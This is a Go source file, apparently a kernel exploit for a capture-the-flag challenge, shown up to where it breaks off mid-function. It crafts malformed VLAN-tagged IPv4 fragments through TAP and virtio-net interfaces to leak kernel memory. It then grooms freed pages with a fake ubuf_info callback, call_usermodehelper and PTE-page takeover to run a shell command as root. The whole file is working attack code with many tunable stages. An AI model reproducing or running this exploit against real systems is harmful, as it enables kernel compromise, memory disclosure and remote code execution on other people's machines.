package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	iffTap         = 0x0002
	iffNoPI        = 0x1000
	iffVnetHdr     = 0x4000
	tunSetIFF      = 0x400454ca
	tunSetSndBuf   = 0x400454d4
	needsCsum      = 1
	mapPopulate    = 0x8000
	mapNoReserve   = 0x4000
	madvNoHugepage = 15
	ipProtoPCP     = 252
	packetRXRing   = 5
	packetVersion  = 10
	tpacketV2      = 1

	ethLen     = 14
	vlanLen    = 4
	ipLen      = 20
	l2Len      = ethLen + vlanLen + vlanLen
	csumAtIP   = l2Len
	vlanProto  = 0x8100
	ipProtoEth = 0x0800

	fragPayload = 8
	restPayload = 400
	marker      = 0xa5
	ipID        = 0x9999
)

func main() {
	if os.Geteuid() != 0 {
		fmt.Fprintln(os.Stderr, "run as root")
		os.Exit(1)
	}
	cfg := parseCfg()
	if err := run(cfg); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

type cfg struct {
	head                   int
	rest                   int
	tebar                  int
	tebarFill              byte
	capture                time.Duration
	count                  int
	page                   bool
	skipVerify             bool
	egress                 bool
	egressRest             int
	iface                  string
	dst                    string
	src                    string
	gateway                string
	dstMAC                 string
	egressWait             time.Duration
	egressSpray            int
	egressFill             byte
	sprayDelay             time.Duration
	vlanTags               int
	answerDstARP           bool
	transport              string
	udpSrcPort             int
	udpPort                int
	tcpSrcPort             int
	tcpPort                int
	tcpValid               bool
	tcpEcho                bool
	staleOptions           bool
	staleOptSkip           int
	staleOptLen            int
	staleGroom             bool
	staleGrooms            int
	staleDelay             time.Duration
	staleEach              time.Duration
	staleHold              bool
	staleHead              uint64
	staleFragPage          uint64
	staleFragFile          string
	staleFragSeeds         int
	staleFragSeedLen       int
	staleFragPadLen        int
	staleFragGSOType       int
	staleFragHdrLen        int
	staleNaturalFrag       bool
	staleNaturalOverlap    bool
	staleOverlapLocal      bool
	staleLocalRollover     int
	staleLocalSingleRef    bool
	staleSingleAnchors     int
	staleSinglePCPPrime    int
	staleSinglePCPWait     time.Duration
	staleSingleAnon        bool
	staleSingleRing        bool
	staleSingleRingSize    int
	staleSinglePTE         bool
	staleSinglePTECount    int
	staleSinglePTETakeover bool
	staleSingleHold        time.Duration
	staleNaturalAnon       bool
	staleAnonSize          int
	staleAnonJumbos        int
	staleAnonWait          time.Duration
	staleSKB               uint64
	staleDev               uint64
	staleHeadFile          string
	staleCallback          uint64
	staleCopyLen           int
	staleExec              uint64
	staleNoop              uint64
	staleCommand           string
	csumOffset             int
	csumWord               uint
}

func parseCfg() cfg {
	c := cfg{}
	flag.IntVar(&c.head, "head", 8, "offset-0 fragment payload; this skb is the linear head (multiple of 8)")
	flag.IntVar(&c.vlanTags, "vlan-tags", 2, "number of nested VID-0 tags before IPv4 (at least 2)")
	flag.IntVar(&c.rest, "rest", 400, "payload carried in the completing fragment")
	flag.IntVar(&c.tebar, "tebar", 0, "128-byte immediately-freed TAP frames written before the head skb")
	fill := flag.Int("tebar-fill", 0xee, "payload byte stored in tebar frames")
	captureMs := flag.Int("capture-ms", 800, "time to collect output fragments")
	flag.IntVar(&c.count, "count", 1, "number of samples; batches buffer output until all samples finish")
	flag.BoolVar(&c.page, "page", false, "force a page_frag head (TUNSETSNDBUF=INT_MAX, nonblocking write)")
	flag.BoolVar(&c.skipVerify, "skip-verify", false, "skip the single-datagram header rewrite check")
	flag.BoolVar(&c.egress, "egress", false, "send the fragment sequence through a real virtio-net interface")
	flag.IntVar(&c.egressRest, "egress-rest", 4000, "payload after the short head in egress mode")
	flag.StringVar(&c.iface, "iface", "eth0", "egress interface")
	flag.StringVar(&c.dst, "dst", "chall.itsbengsky.id", "egress IPv4 destination or hostname")
	flag.StringVar(&c.src, "src", "", "source IPv4 override (default: interface address)")
	flag.StringVar(&c.gateway, "gateway", "", "next-hop IPv4 override (default: /proc/net/route)")
	flag.StringVar(&c.dstMAC, "dst-mac", "", "next-hop MAC override (default: /proc/net/arp)")
	flag.IntVar(&c.egressSpray, "egress-spray", 0, "128-byte immediately-freed host-TAP frames sent before each malicious head")
	egressFill := flag.Int("egress-spray-fill", 0xee, "payload byte stored in egress spray frames")
	sprayDelayUS := flag.Int("spray-delay-us", 1000, "delay after predecessor frames, allowing them to be freed before the malicious head")
	flag.BoolVar(&c.answerDstARP, "answer-dst-arp", false, "answer ARP for -dst so host-routed fragments hairpin back to this interface")
	flag.StringVar(&c.transport, "egress-transport", "udp", "egress carrier: udp, tcp, or raw253")
	flag.IntVar(&c.udpSrcPort, "udp-source-port", 0x0101, "UDP source port (also the first two post-mutation IPv4 option bytes)")
	flag.IntVar(&c.udpPort, "udp-port", 9, "closed destination port used by the UDP carrier")
	flag.IntVar(&c.tcpSrcPort, "tcp-source-port", 0x0100, "TCP source port (default bytes become NOP,END IPv4 options after mutation)")
	flag.IntVar(&c.tcpPort, "tcp-port", 443, "destination port used by the TCP carrier")
	flag.BoolVar(&c.tcpValid, "tcp-valid-checksum", false, "choose payload length and dual TCP checksums so TCP is valid before and after mutation")
	flag.BoolVar(&c.tcpEcho, "tcp-echo-options", false, "encode a valid Timestamp option and recognize a TCP peer echoing the disclosed option bytes")
	flag.BoolVar(&c.staleOptions, "stale-options-write", false, "lab-only: shrink a parsed 60-byte IPv4 header and exercise stale option processing on short frag_list children")
	flag.IntVar(&c.staleOptSkip, "stale-option-skip", 0, "lab-only: copied option bytes before the stale non-copied option (0 or 2..6)")
	flag.IntVar(&c.staleOptLen, "stale-option-len", 40, "lab-only: bytes changed to IPOPT_NOOP by the stale option")
	flag.BoolVar(&c.staleGroom, "stale-page-groom", false, "lab-only: seed one page-frag chunk with a 0x6b marker before the short child (exploratory)")
	flag.IntVar(&c.staleGrooms, "stale-groom-count", 1, "lab-only: number of 3840-byte marker allocations before the short child")
	staleDelayMs := flag.Int("stale-groom-delay-ms", 50, "lab-only: delay after marker allocations")
	staleEachUS := flag.Int("stale-groom-each-delay-us", 0, "lab-only: delay after each marker allocation")
	flag.BoolVar(&c.staleHold, "stale-groom-hold", true, "lab-only: hold marker SKBs in a TAP packet-socket queue until all chunks are allocated")
	flag.Uint64Var(&c.staleHead, "stale-groom-head", 0, "lab-only: predicted victim skb head address for fake ubuf_info")
	flag.Uint64Var(&c.staleFragPage, "stale-groom-frag-page", 0, "lab-only: seed frags[0] with an observed struct page pointer")
	flag.StringVar(&c.staleFragFile, "stale-groom-frag-page-file", "", "lab-only: two-stage mode; wait for an observed task_frag struct page pointer")
	flag.IntVar(&c.staleFragSeeds, "stale-frag-seed-count", 0, "lab-only: write oversized GSO frames whose host skb heads contain genuine frags[0]")
	flag.IntVar(&c.staleFragSeedLen, "stale-frag-seed-len", 8192, "lab-only: oversized GSO seed frame length")
	flag.IntVar(&c.staleFragPadLen, "stale-frag-pad-len", 0, "lab-only: pad the short middle fragment into an oversized GSO frame")
	flag.IntVar(&c.staleFragGSOType, "stale-frag-gso-type", 1, "lab-only: virtio-net GSO type used by oversized fragment probes")
	flag.IntVar(&c.staleFragHdrLen, "stale-frag-hdr-len", 70, "lab-only: linear header length requested for oversized fragment probes")
	flag.BoolVar(&c.staleNaturalFrag, "stale-natural-frag", false, "use the address-independent jumbo-fragment geometry that naturally plants frags[0]")
	flag.BoolVar(&c.staleNaturalOverlap, "stale-natural-overlap", false, "lab-only: reclaim the dangling natural-fragment page and verify a live skb payload overlap")
	flag.BoolVar(&c.staleOverlapLocal, "stale-overlap-local-reassembly", false, "lab-only: deliver the second reclaim datagram locally so IPv4 reassembly runs skb_try_coalesce")
	flag.IntVar(&c.staleLocalRollover, "stale-local-rollover", 0, "lab-only: page-frag-sized writes after queueing the local reassembly, forcing dangling task_frag refill")
	flag.BoolVar(&c.staleLocalSingleRef, "stale-local-single-ref", false, "lab-only: keep one coalesced page reference so rollover frees the page cleanly under a stale jumbo descriptor")
	flag.IntVar(&c.staleSingleAnchors, "stale-single-ref-anchors", 8, "lab-only: incomplete order-3 anchors and reclaim candidates used by the single-ref chain")
	flag.IntVar(&c.staleSinglePCPPrime, "stale-single-ref-pcp-prime", 0, "lab-only: completed order-3 local datagrams released after the single-reference target to force a PCP drain")
	staleSinglePCPWaitMs := flag.Int("stale-single-ref-pcp-wait-ms", 1000, "lab-only: grace interval for deferred PCP-prime receive-queue release")
	flag.BoolVar(&c.staleSingleAnon, "stale-single-ref-anon", false, "lab-only: after PCP priming, reclaim the cleanly freed order-3 target as order-0 anonymous pages")
	flag.BoolVar(&c.staleSingleRing, "stale-single-ref-packet-ring", false, "lab-only: after PCP priming, reclaim the cleanly freed order-3 target as order-0 PACKET_RX_RING pages")
	flag.IntVar(&c.staleSingleRingSize, "stale-single-ref-ring-size", 64<<20, "lab-only: bytes in the order-0 PACKET_RX_RING reclaim spray")
	flag.BoolVar(&c.staleSinglePTE, "stale-single-ref-pte", false, "lab-only: reclaim the cleanly freed order-3 target as a process PTE page")
	flag.IntVar(&c.staleSinglePTECount, "stale-single-ref-pte-count", 8192, "lab-only: sparse 2 MiB regions faulted to allocate distinct PTE pages")
	flag.BoolVar(&c.staleSinglePTETakeover, "stale-single-ref-pte-takeover", false, "lab-only: reclaim the prematurely freed live PTE page with controlled packet-ring entries")
	staleSingleHoldMs := flag.Int("stale-single-ref-hold-ms", 0, "lab-only: keep the process alive after a PTE result so the disposable VM can be shut down before mm teardown")
	flag.BoolVar(&c.staleNaturalAnon, "stale-natural-anon", false, "lab-only: reclaim the dangling natural-fragment page as an anonymous mapping and verify a write through task_frag")
	flag.IntVar(&c.staleAnonSize, "stale-anon-size", 64<<20, "lab-only: bytes of anonymous memory faulted while reclaiming the dangling page")
	flag.IntVar(&c.staleAnonJumbos, "stale-anon-jumbos", 96, "lab-only: incomplete order-3 fragments released together before the anonymous reclaim")
	staleAnonWaitMs := flag.Int("stale-anon-wait-ms", 32000, "lab-only: wait for the incomplete fragment queues to expire")
	flag.Uint64Var(&c.staleSKB, "stale-groom-skb", 0, "lab-only: optional observed victim sk_buff address for calibration diagnostics")
	flag.Uint64Var(&c.staleDev, "stale-groom-dev", 0, "lab-only: optional observed victim net_device address for calibration diagnostics")
	flag.StringVar(&c.staleHeadFile, "stale-groom-head-file", "", "lab-only: two-stage mode; wait for a file containing the probed victim head address")
	flag.Uint64Var(&c.staleCallback, "stale-groom-callback", 0, "lab-only: fake ubuf_info completion callback address")
	flag.IntVar(&c.staleCopyLen, "stale-copy-len", 0, "lab-only: terminate fake ubuf_info after this many non-NUL bytes for a strcpy callback")
	flag.Uint64Var(&c.staleExec, "stale-groom-umh-async", 0, "lab-only: call_usermodehelper_exec_async address used after a strcpy callback")
	flag.Uint64Var(&c.staleNoop, "stale-groom-noop-ret", 0, "lab-only: zero-returning callback used by the fake subprocess_info")
	flag.StringVar(&c.staleCommand, "stale-groom-command", "echo BENGSKY_RCE_OK >/tmp/bengsky-rce", "lab-only: /bin/sh -c command for the fake subprocess_info")
	flag.IntVar(&c.csumOffset, "csum-offset", 0, "deferred checksum write offset from the IPv4 header start")
	flag.UintVar(&c.csumWord, "csum-word", 0x004f, "desired host-endian 16-bit deferred checksum value")
	egressWaitMs := flag.Int("egress-wait-ms", 5000, "time to collect ICMP quotations in egress mode")
	flag.Parse()
	c.tebarFill = byte(*fill)
	c.egressFill = byte(*egressFill)
	c.sprayDelay = time.Duration(*sprayDelayUS) * time.Microsecond
	c.capture = time.Duration(*captureMs) * time.Millisecond
	c.staleDelay = time.Duration(*staleDelayMs) * time.Millisecond
	c.staleEach = time.Duration(*staleEachUS) * time.Microsecond
	c.staleAnonWait = time.Duration(*staleAnonWaitMs) * time.Millisecond
	c.staleSinglePCPWait = time.Duration(*staleSinglePCPWaitMs) * time.Millisecond
	c.staleSingleHold = time.Duration(*staleSingleHoldMs) * time.Millisecond
	c.egressWait = time.Duration(*egressWaitMs) * time.Millisecond
	if c.staleNaturalFrag {
		applyStaleNaturalFrag(&c)
	}
	if c.head < 8 || c.head%8 != 0 || c.head > 40 {
		fmt.Fprintln(os.Stderr, "-head must be a multiple of 8 in 8..40")
		os.Exit(1)
	}
	if c.vlanTags < 2 || c.vlanTags > 128 {
		fmt.Fprintln(os.Stderr, "-vlan-tags must be in 2..128")
		os.Exit(1)
	}
	if c.rest < 16 {
		fmt.Fprintln(os.Stderr, "-rest must be at least 16")
		os.Exit(1)
	}
	if c.capture <= 0 {
		fmt.Fprintln(os.Stderr, "-capture-ms must be positive")
		os.Exit(1)
	}
	if c.count <= 0 {
		fmt.Fprintln(os.Stderr, "-count must be positive")
		os.Exit(1)
	}
	if c.egress && c.count > 65536 {
		fmt.Fprintln(os.Stderr, "egress -count must not exceed 65536 unique IPv4 IDs")
		os.Exit(1)
	}
	if c.egressSpray < 0 || c.egressSpray > 4096 {
		fmt.Fprintln(os.Stderr, "-egress-spray must be in 0..4096")
		os.Exit(1)
	}
	if *sprayDelayUS < 0 || *sprayDelayUS > 1000000 {
		fmt.Fprintln(os.Stderr, "-spray-delay-us must be in 0..1000000")
		os.Exit(1)
	}
	if c.egressRest < 64 || c.head+c.egressRest > 65515 {
		fmt.Fprintln(os.Stderr, "-egress-rest must produce an IPv4 datagram of 84..65535 bytes")
		os.Exit(1)
	}
	if c.egressWait <= 0 {
		fmt.Fprintln(os.Stderr, "-egress-wait-ms must be positive")
		os.Exit(1)
	}
	if c.transport != "udp" && c.transport != "tcp" && c.transport != "raw253" {
		fmt.Fprintln(os.Stderr, "-egress-transport must be udp, tcp, or raw253")
		os.Exit(1)
	}
	if (c.transport == "udp" || c.transport == "tcp") && c.head != 8 {
		fmt.Fprintln(os.Stderr, "UDP and TCP egress transports require -head 8")
		os.Exit(1)
	}
	if c.udpSrcPort < 1 || c.udpSrcPort > 65535 || c.udpPort < 1 || c.udpPort > 65535 {
		fmt.Fprintln(os.Stderr, "-udp-source-port and -udp-port must be in 1..65535")
		os.Exit(1)
	}
	if c.tcpSrcPort < 1 || c.tcpSrcPort > 65535 || c.tcpPort < 1 || c.tcpPort > 65535 {
		fmt.Fprintln(os.Stderr, "-tcp-source-port and -tcp-port must be in 1..65535")
		os.Exit(1)
	}
	if c.tcpValid && (!c.egress || c.transport != "tcp") {
		fmt.Fprintln(os.Stderr, "-tcp-valid-checksum requires -egress -egress-transport tcp")
		os.Exit(1)
	}
	if c.tcpEcho && !c.tcpValid {
		fmt.Fprintln(os.Stderr, "-tcp-echo-options requires -tcp-valid-checksum")
		os.Exit(1)
	}
	if c.staleNaturalFrag && !c.staleOptions {
		fmt.Fprintln(os.Stderr, "-stale-natural-frag requires -stale-options-write")
		os.Exit(1)
	}
	if c.staleNaturalOverlap && !c.staleNaturalFrag {
		fmt.Fprintln(os.Stderr, "-stale-natural-overlap requires -stale-natural-frag")
		os.Exit(1)
	}
	if c.staleNaturalAnon && !c.staleNaturalFrag {
		fmt.Fprintln(os.Stderr, "-stale-natural-anon requires -stale-natural-frag")
		os.Exit(1)
	}
	if c.staleNaturalAnon && c.staleNaturalOverlap {
		fmt.Fprintln(os.Stderr, "-stale-natural-anon and -stale-natural-overlap are separate reclaim experiments")
		os.Exit(1)
	}
	if c.staleOverlapLocal && !c.staleNaturalOverlap {
		fmt.Fprintln(os.Stderr, "-stale-overlap-local-reassembly requires -stale-natural-overlap")
		os.Exit(1)
	}
	if c.staleLocalRollover < 0 || c.staleLocalRollover > 64 || (c.staleLocalRollover != 0 && !c.staleOverlapLocal) {
		fmt.Fprintln(os.Stderr, "-stale-local-rollover must be 0..64 and requires -stale-overlap-local-reassembly")
		os.Exit(1)
	}
	if c.staleLocalSingleRef && (!c.staleOverlapLocal || c.staleLocalRollover == 0) {
		fmt.Fprintln(os.Stderr, "-stale-local-single-ref requires -stale-overlap-local-reassembly and a nonzero -stale-local-rollover")
		os.Exit(1)
	}
	if c.staleSingleAnchors < 1 || c.staleSingleAnchors > 64 {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-anchors must be 1..64")
		os.Exit(1)
	}
	if c.staleSinglePCPPrime < 0 || c.staleSinglePCPPrime > 2048 || (c.staleSinglePCPPrime != 0 && !c.staleLocalSingleRef) {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-pcp-prime must be 0..2048 and requires -stale-local-single-ref")
		os.Exit(1)
	}
	if c.staleSinglePCPWait < 0 || c.staleSinglePCPWait > 10*time.Second {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-pcp-wait-ms must be 0..10000")
		os.Exit(1)
	}
	if c.staleSingleAnon && (!c.staleLocalSingleRef || c.staleSinglePCPPrime == 0) {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-anon requires -stale-local-single-ref and a nonzero -stale-single-ref-pcp-prime")
		os.Exit(1)
	}
	if c.staleSingleRing && (!c.staleLocalSingleRef || c.staleSinglePCPPrime == 0) {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-packet-ring requires -stale-local-single-ref and a nonzero -stale-single-ref-pcp-prime")
		os.Exit(1)
	}
	if c.staleSinglePTE && (!c.staleLocalSingleRef || c.staleSinglePCPPrime == 0) {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-pte requires -stale-local-single-ref and a nonzero -stale-single-ref-pcp-prime")
		os.Exit(1)
	}
	if (c.staleSingleAnon && c.staleSingleRing) || (c.staleSingleAnon && c.staleSinglePTE) || (c.staleSingleRing && c.staleSinglePTE) {
		fmt.Fprintln(os.Stderr, "the single-reference anonymous, packet-ring, and PTE modes are separate order-0 reclaim experiments")
		os.Exit(1)
	}
	if c.staleSingleRingSize < 8<<20 || c.staleSingleRingSize > 256<<20 || c.staleSingleRingSize%4096 != 0 {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-ring-size must be page-aligned and in 8 MiB..256 MiB")
		os.Exit(1)
	}
	if c.staleSinglePTECount < 1024 || c.staleSinglePTECount > 16384 {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-pte-count must be 1024..16384")
		os.Exit(1)
	}
	if c.staleSinglePTETakeover && !c.staleSinglePTE {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-pte-takeover requires -stale-single-ref-pte")
		os.Exit(1)
	}
	if c.staleSingleHold < 0 || c.staleSingleHold > 5*time.Minute {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-hold-ms must be 0..300000")
		os.Exit(1)
	}
	if c.staleSingleHold != 0 && !c.staleSinglePTE {
		fmt.Fprintln(os.Stderr, "-stale-single-ref-hold-ms requires -stale-single-ref-pte")
		os.Exit(1)
	}
	if c.staleAnonSize < 8<<20 || c.staleAnonSize > 1<<30 || c.staleAnonSize%4096 != 0 {
		fmt.Fprintln(os.Stderr, "-stale-anon-size must be page-aligned and in 8 MiB..1 GiB")
		os.Exit(1)
	}
	if c.staleAnonJumbos < 1 || c.staleAnonJumbos > 1024 || c.staleAnonWait < 0 || c.staleAnonWait > 2*time.Minute {
		fmt.Fprintln(os.Stderr, "-stale-anon-jumbos must be 1..1024 and -stale-anon-wait-ms must be 0..120000")
		os.Exit(1)
	}
	if c.staleOptions && c.egress && !c.staleNaturalFrag {
		fmt.Fprintln(os.Stderr, "egress stale-options mode requires -stale-natural-frag")
		os.Exit(1)
	}
	if c.staleOptions && c.staleOptSkip != 0 && (c.staleOptSkip < 2 || c.staleOptSkip > 6) {
		fmt.Fprintln(os.Stderr, "-stale-option-skip must be 0 or in 2..6")
		os.Exit(1)
	}
	if c.staleOptions && (c.staleOptLen < 2 || c.staleOptSkip+c.staleOptLen > 40) {
		fmt.Fprintln(os.Stderr, "-stale-option-len must be at least 2 and keep skip+len within 40")
		os.Exit(1)
	}
	if c.staleGroom && (!c.staleOptions || !c.page) {
		fmt.Fprintln(os.Stderr, "-stale-page-groom requires -stale-options-write -page")
		os.Exit(1)
	}
	if c.staleGrooms < 1 || c.staleGrooms > 256 || c.staleDelay < 0 || c.staleDelay > 10*time.Second || c.staleEach < 0 || c.staleEach > time.Second {
		fmt.Fprintln(os.Stderr, "stale groom count must be 1..256, final delay 0..10000 ms, and per-groom delay 0..1000000 us")
		os.Exit(1)
	}
	if c.staleHeadFile != "" && c.staleHead != 0 {
		fmt.Fprintln(os.Stderr, "use either -stale-groom-head or -stale-groom-head-file")
		os.Exit(1)
	}
	if (c.staleHead != 0 || c.staleHeadFile != "") != (c.staleCallback != 0) || ((c.staleHead != 0 || c.staleHeadFile != "") && !c.staleGroom) {
		fmt.Fprintln(os.Stderr, "stale groom head/head-file and callback must be supplied together and require -stale-page-groom")
		os.Exit(1)
	}
	if c.staleFragPage != 0 && c.staleFragFile != "" {
		fmt.Fprintln(os.Stderr, "use either -stale-groom-frag-page or -stale-groom-frag-page-file")
		os.Exit(1)
	}
	if (c.staleFragPage != 0 || c.staleFragFile != "") && (!c.staleGroom || c.staleHead != 0 || c.staleHeadFile != "" || c.staleCallback != 0) {
		fmt.Fprintln(os.Stderr, "stale fragment-page grooming requires -stale-page-groom and cannot be combined with callback grooming")
		os.Exit(1)
	}
	if c.staleFragPage&63 != 0 {
		fmt.Fprintln(os.Stderr, "-stale-groom-frag-page must be a 64-byte-aligned struct page pointer")
		os.Exit(1)
	}
	if c.staleFragSeeds < 0 || c.staleFragSeeds > 4096 || c.staleFragSeedLen < 4096 || c.staleFragSeedLen > 65525 {
		fmt.Fprintln(os.Stderr, "stale fragment seed count must be 0..4096 and length 4096..65525")
		os.Exit(1)
	}
	if c.staleFragSeeds != 0 && (!c.staleOptions || !c.page) {
		fmt.Fprintln(os.Stderr, "-stale-frag-seed-count requires -stale-options-write -page")
		os.Exit(1)
	}
	if c.staleFragPadLen != 0 && (c.staleFragPadLen < 4096 || c.staleFragPadLen > 65525 || !c.staleOptions || (!c.page && !c.egress)) {
		fmt.Fprintln(os.Stderr, "-stale-frag-pad-len must be 0 or 4096..65525 and requires -stale-options-write -page")
		os.Exit(1)
	}
	if c.staleFragGSOType < 0 || c.staleFragGSOType > 5 {
		fmt.Fprintln(os.Stderr, "-stale-frag-gso-type must be in 0..5")
		os.Exit(1)
	}
	if c.staleFragHdrLen < 14 || c.staleFragHdrLen > 384 {
		fmt.Fprintln(os.Stderr, "-stale-frag-hdr-len must be in 14..384")
		os.Exit(1)
	}
	if c.staleCopyLen < 0 || c.staleCopyLen > 80 || (c.staleCopyLen != 0 && c.staleCallback == 0) {
		fmt.Fprintln(os.Stderr, "-stale-copy-len must be in 0..80 and requires stale groom head/head-file plus callback")
		os.Exit(1)
	}
	if c.staleExec != 0 && ((c.staleHead == 0 && c.staleHeadFile == "") || c.staleCallback == 0 || c.staleNoop == 0) {
		fmt.Fprintln(os.Stderr, "-stale-groom-umh-async requires stale groom head/head-file, callback, and noop-ret addresses")
		os.Exit(1)
	}
	if c.transport == "tcp" && ((!c.egress && c.head+c.rest < 60) || (c.egress && c.head+c.egressRest < 60)) {
		fmt.Fprintln(os.Stderr, "TCP egress transport requires at least 60 bytes of IPv4 payload")
		os.Exit(1)
	}
	maxCsumOffset := ipLen + c.head - 2
	if c.csumOffset < 0 || c.csumOffset > maxCsumOffset {
		fmt.Fprintf(os.Stderr, "-csum-offset must be in 0..%d for -head %d\n", maxCsumOffset, c.head)
		os.Exit(1)
	}
	if c.csumWord > 0xffff {
		fmt.Fprintln(os.Stderr, "-csum-word must fit in 16 bits")
		os.Exit(1)
	}
	if c.csumWord == 0xffff {
		fmt.Fprintln(os.Stderr, "-csum-word 0xffff is not attainable for a nonempty checksum input")
		os.Exit(1)
	}
	if c.egress && (c.csumOffset != 0 || c.csumWord != 0x004f) {
		fmt.Fprintln(os.Stderr, "egress mode currently requires the verified -csum-offset 0 -csum-word 0x004f geometry")
		os.Exit(1)
	}
	return c
}

func applyStaleNaturalFrag(c *cfg) {
	c.page = true
	c.vlanTags = 69
	c.staleOptSkip = 6
	c.staleOptLen = 7
	c.staleFragPadLen = 33086
	c.staleFragGSOType = 0
	c.staleFragHdrLen = 318
}

func run(c cfg) error {
	if c.egress {
		if c.staleOptions {
			return runStaleOptionsEgress(c)
		}
		return runEgress(c)
	}
	tapName := getenv("PWN_TAP", "bengskytap")
	capName := getenv("PWN_CAP", "bengskyv1")
	if _, err := net.InterfaceByName(tapName); err != nil {
		return fmt.Errorf("tap %s is not present: %w", tapName, err)
	}
	if _, err := net.InterfaceByName(capName); err != nil {
		return fmt.Errorf("capture iface %s is missing: %w", capName, err)
	}
	tap, err := openTap(tapName, c.page)
	if err != nil {
		return fmt.Errorf("attach %s: %w", tapName, err)
	}
	defer tap.Close()

	cap, err := listen(capName)
	if err != nil {
		return err
	}
	defer cap.Close()
	if c.staleOptions {
		return runStaleOptionsWrite(tap, cap, c)
	}

	if !c.skipVerify {
		if err := verifyWrite(tap, cap, c); err != nil {
			return err
		}
	}
	seen := make(map[string][]byte)
	verbose := c.count == 1
	for i := 0; i < c.count; i++ {
		leaks, err := bali(tap, cap, c, verbose)
		if err != nil {
			return err
		}
		for _, leak := range leaks {
			seen[string(leak)] = leak
		}
	}
	if !verbose {
		keys := make([]string, 0, len(seen))
		for key := range seen {
			keys = append(keys, key)
		}
		sort.Strings(keys)
		for _, key := range keys {
			leak := seen[key]
			fmt.Printf("past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
		}
	}
	return nil
}

func runStaleOptionsWrite(tap *os.File, cap *capture, c cfg) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	restoreAffinity, err := pinCurrentThreadToAllowedCPU()
	if err != nil {
		return fmt.Errorf("stale-options: pin current thread to one CPU: %w", err)
	}
	defer restoreAffinity()
	if c.staleFragFile != "" {
		probe := c
		probe.staleOptLen = 14
		probe.staleFragPage = 0
		if err := runStaleOptionsAttempt(tap, cap, probe); err != nil {
			return fmt.Errorf("stale fragment-page probe stage: %w", err)
		}
		fmt.Printf("stale-options: fragment-page probe ready; write the observed task_frag struct page to %s\n", c.staleFragFile)
		addresses, err := waitForKernelAddresses(c.staleFragFile, 30*time.Second)
		if err != nil {
			return err
		}
		attack := c
		attack.staleFragPage = addresses[0]
		attack.staleFragFile = ""
		attack.staleGrooms = 8
		fmt.Printf("stale-options: fragment-page stage page=%#x option_len=%d groom_count=%d\n",
			attack.staleFragPage, attack.staleOptLen, attack.staleGrooms)
		return runStaleOptionsAttempt(tap, cap, attack)
	}
	if c.staleHeadFile == "" {
		return runStaleOptionsAttempt(tap, cap, c)
	}

	probe := c
	probe.staleOptLen = 14
	probe.staleHead = 0
	probe.staleCallback = 0
	if err := runStaleOptionsAttempt(tap, cap, probe); err != nil {
		return fmt.Errorf("stale-options probe stage: %w", err)
	}
	fmt.Printf("stale-options: probe ready; write the observed victim head to %s\n", c.staleHeadFile)
	addresses, err := waitForKernelAddresses(c.staleHeadFile, 30*time.Second)
	if err != nil {
		return err
	}
	attack := c
	attack.staleHead = addresses[0]
	if len(addresses) >= 3 {
		attack.staleSKB = addresses[1]
		attack.staleDev = addresses[2]
	}
	attack.staleHeadFile = ""
	// The probe leaves its victim page cached in this task_frag. Eight
	// 3840-byte held grooms seed that same page without advancing to another.
	attack.staleGrooms = 8
	fmt.Printf("stale-options: callback stage head=%#x skb=%#x dev=%#x callback=%#x groom_count=%d\n",
		attack.staleHead, attack.staleSKB, attack.staleDev, attack.staleCallback, attack.staleGrooms)
	return runStaleOptionsAttempt(tap, cap, attack)
}

func pinCurrentThreadToAllowedCPU() (func(), error) {
	var oldMask [128]byte
	_, _, errno := syscall.RawSyscall(syscall.SYS_SCHED_GETAFFINITY, 0,
		uintptr(len(oldMask)), uintptr(unsafe.Pointer(&oldMask[0])))
	if errno != 0 {
		return nil, errno
	}
	var oneCPUMask [128]byte
	found := false
	for i, b := range oldMask {
		if b == 0 {
			continue
		}
		for bit := byte(1); bit != 0; bit <<= 1 {
			if b&bit != 0 {
				oneCPUMask[i] = bit
				found = true
				break
			}
		}
		break
	}
	if !found {
		return nil, errors.New("empty sched_getaffinity mask")
	}
	_, _, errno = syscall.RawSyscall(syscall.SYS_SCHED_SETAFFINITY, 0,
		uintptr(len(oneCPUMask)), uintptr(unsafe.Pointer(&oneCPUMask[0])))
	if errno != 0 {
		return nil, errno
	}
	return func() {
		syscall.RawSyscall(syscall.SYS_SCHED_SETAFFINITY, 0,
			uintptr(len(oldMask)), uintptr(unsafe.Pointer(&oldMask[0])))
	}, nil
}

func waitForKernelAddresses(path string, timeout time.Duration) ([]uint64, error) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		data, err := os.ReadFile(path)
		if err == nil && strings.TrimSpace(string(data)) != "" {
			fields := strings.Fields(string(data))
			values := make([]uint64, 0, len(fields))
			for _, field := range fields {
				value, parseErr := strconv.ParseUint(field, 0, 64)
				if parseErr != nil {
					return nil, fmt.Errorf("parse victim addresses from %s: %w", path, parseErr)
				}
				values = append(values, value)
			}
			return values, nil
		}
		if err != nil && !errors.Is(err, os.ErrNotExist) {
			return nil, fmt.Errorf("read victim head from %s: %w", path, err)
		}
		time.Sleep(20 * time.Millisecond)
	}
	return nil, fmt.Errorf("timed out waiting for victim head in %s", path)
}

func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
	var anon []byte
	if c.staleFragSeeds != 0 {
		frame := staleFragSeedFrame(c.staleFragSeedLen, 0x73)
		for i := 0; i < c.staleFragSeeds; i++ {
			if err := writeTapGSO(tap, frame, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400, true, 34, 16); err != nil {
				return fmt.Errorf("stale-options: fragment seed %d/%d: %w", i+1, c.staleFragSeeds, err)
			}
		}
		fmt.Printf("stale-options: fragment seeds=%d frame_len=%d gso_type=%d gso_hdr_len=%d gso_size=1400\n",
